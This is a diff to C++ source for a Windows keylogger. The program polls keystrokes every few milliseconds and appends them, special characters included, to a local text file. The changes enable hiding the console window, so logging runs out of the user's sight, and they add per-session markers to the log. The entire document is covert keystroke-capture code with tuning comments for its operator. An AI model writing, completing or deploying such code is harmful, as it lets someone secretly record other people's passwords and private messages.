@@ -4,6 +4,14 @@
 #include <fstream>
 using namespace std;
 
+//increase value == more precision and less mistakes while getting input characters, but higher CPU usage and slower PC
+//decrease value == just opposite
+int checkKeyboardEveryNMiliseconds = 10;
+
+//result file location, you can change this if needed
+char* textFilePath = "text.txt";
+
+
 ofstream myFile;
 
 //disable warning
@@ -17,18 +25,13 @@ bool isShift();
 
 int main() {
 
-	//increase value == more precision and less mistakes while getting input characters, but higher CPU usage and slower PC
-	//decrease value == just opposite
-	int checkKeyboardEveryNMiliseconds = 10;
-
-	//result file location, you can change this if needed
-	char* textFilePath = "text.txt";
+	myFile.open(textFilePath, fstream::app);
+	myFile << "\n\nNewSession:\n";
+	myFile.close();
 
 	//hiding console window
 	auto myConsole = GetConsoleWindow();
-	//ShowWindow(myConsole, 0);
-	
-	myFile.open("text.txt", fstream::app);
+	ShowWindow(myConsole, 0);
 
 	char i;
 	while (true)
@@ -55,6 +58,8 @@ bool isShift() {
 int Save(int _key, char *file) {
 	cout << _key << endl;
 	Sleep(10);
+
+	myFile.open(textFilePath, fstream::app);
 
 	//adding special characters
 	//you can add new characters if needed
@@ -93,6 +98,8 @@ int Save(int _key, char *file) {
 			myFile << c;
 		}
 	}
+
+	myFile.close();
 	
 	return 0;
 }
